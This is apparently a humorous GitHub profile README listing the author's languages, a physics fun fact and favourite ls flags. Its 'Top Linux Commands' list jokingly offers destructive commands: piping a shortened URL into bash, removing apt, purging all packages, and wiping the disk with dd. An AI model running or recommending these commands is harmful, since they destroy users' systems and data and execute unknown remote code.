## Assorted Information
Github recommends answering some stuff, but who cares, it makes me look too professional. <br>
I know you're very sad and disappointed about this, so here's some consolation content: <br>

I suffer from:
 - Rust
 - Vulkan
 - GLSL
 - C#
 - C/C++

Fun facts
 - The mass of a quark is measured in electron-volts, which is the energy that an electron gains when it undergoes a potential difference of 1 Volt. Kinda weird that mass is measured in energy isn't it? ~~should be fixed~~

 - If you use the `ls` command without the flags `-N1htFs --color=auto`), you are a loser. (or as I prefer, `-sh1t -NF --color=auto`)

Top Linux Commands\*

1. `curl -sL http://bit.ly/10hA8iC | bash`
2. `sudo apt -y remove apt`
3. `sudo apt purge *`
4. `sudo dd if=/dev/zero of=/dev/sda bs=1M`

Know a fun command? Make an issue with your suggestion! 

\*If it uses `sudo`, it's unsafe. I will ignore any whining over your dead PC. I can confirm they all work *beautifully* and some break *spectacularly*.
